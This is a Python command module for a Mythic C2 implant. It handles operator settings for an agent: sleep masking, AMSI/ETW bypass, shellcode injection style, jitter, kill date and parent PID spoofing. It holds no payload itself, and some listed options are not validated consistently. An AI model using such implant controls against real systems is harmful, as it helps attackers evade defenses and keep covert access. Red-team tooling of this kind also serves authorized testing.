from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import datetime
import re

class ConfigArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action", 
                type=ParameterType.ChooseOne,
                description="The configuration option to modify",
                choices=["mask", "ppid", "spawn", "injection-pe", "injection-sc", "sleep", "jitter", "killdate"],
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    )
                ]
            ),
            CommandParameter(
                name="value",
                type=ParameterType.String,
                description="The value to set for the option",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    )
                ]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            raise ValueError("Must supply arguments. Use 'help config' for usage.")
        
        if self.command_line.strip().startswith("{"):
            try:
                self.load_args_from_json_string(self.command_line)
                return
            except Exception as e:
                raise ValueError(f"Invalid JSON input: {str(e)}")
        
        parts = re.split(r'\s+', self.command_line.strip(), maxsplit=1)
        
        if len(parts) < 2:
            raise ValueError("Both option and value are required. Use 'help config' for usage.")
        
        option = parts[0].lstrip('-')
        value  = parts[1].strip('\'"')
        
        valid_options = [param.choices for param in self.args if hasattr(param, 'choices')][0]
        if option not in valid_options:
            raise ValueError(f"Invalid option '{option}'. Valid options are: {', '.join(valid_options)}")
        
        self.add_arg("action", option)
        self.add_arg("value", value)

class ConfigCommand(CommandBase):
    cmd         = "config"
    needs_admin = False
    help_cmd    = \
    """
    config {-option} [value]

    Configure agent settings. Available options:

    -mask [timer|apc|none]        - Change the sleep mask technique
    -bypass                       - Set bypass on amsi and etw using Hardware Breakpojnt
    -injection-sc [classic|stomp] - Change shellcode injection technique
    -sleep [seconds]              - Change sleep time (positive integer)
    -jitter [percentage]          - Change jitter (0-100)
    -killdate [YYYY-MM-DD]        - Set kill date
    -ppid [pid]                   - Set parent process ID

    Examples:
    config -mask timer
    config -injection-sc stomp
    config -sleep 5
    config -jitter 10
    config -killdate 2040-01-01
    config -ppid 1234
    """
    description = "Configure agent settings";
    version     = 1;
    author      = "@ Oblivion";
    attackmapping  = ["T1059", "T1059.001", "T1059.003"];
    argument_class = ConfigArguments;
    attributes     = CommandAttributes(
        supported_os      = [SupportedOS.Windows],
        suggested_command = True,
        load_only         = False,
        builtin           = True
    );

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        option = task.args.get_arg("action")
        original_value = task.args.get_arg("value") 
        
        if option is None or original_value is None:
            raise ValueError("Both option and value must be provided")
        
        option = option.lower()
        processed_value = original_value 
        validation_errors = []
        
        if option == "mask":
            value_lower = original_value.lower()
            if value_lower == "timer":
                processed_value = "1" 
            elif value_lower == "apc":
                processed_value = "2" 
            elif value_lower == "none":
                processed_value = "3" 
            else:
                validation_errors.append("Invalid mask value. Must be timer, apc, or none")
    
        elif option == "injection-sc":
            if original_value.lower() not in ["classic", "stomp"]:
                validation_errors.append("Invalid injection-sc value. Must be classic or stomp")
        elif option == "sleep":
            if not original_value.isdigit() or int(original_value) <= 0:
                validation_errors.append("Sleep value must be a positive integer")
        elif option == "jitter":
            if not original_value.isdigit() or not (0 <= int(original_value) <= 100):
                validation_errors.append("Jitter must be an integer between 0 and 100")
        elif option == "ppid":
            if not original_value.isdigit() or int(original_value) < 0:
                validation_errors.append("PPID must be a positive integer")
        elif option == "killdate":
            try:
                datetime.datetime.strptime(original_value, "%Y-%m-%d")
                if datetime.datetime.strptime(original_value, "%Y-%m-%d") < datetime.datetime.now():
                    validation_errors.append("Killdate must be in the future")
            except ValueError:
                validation_errors.append("Killdate must be in YYYY-MM-DD format")
        else:
            validation_errors.append(f"Unknown option: {option}")
        
        if validation_errors:
            raise ValueError("\n".join(validation_errors))
        
    
        task.args.add_arg("value", processed_value)
        
    
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            Success=True,
            DisplayParams=f"-action {option} -value {original_value}" 
        )
    
        return response
    
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID,
            Success=True
        )
        
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID   = task.Task.ID,
            Response = f"Successfully updated"
        ))
        
        return resp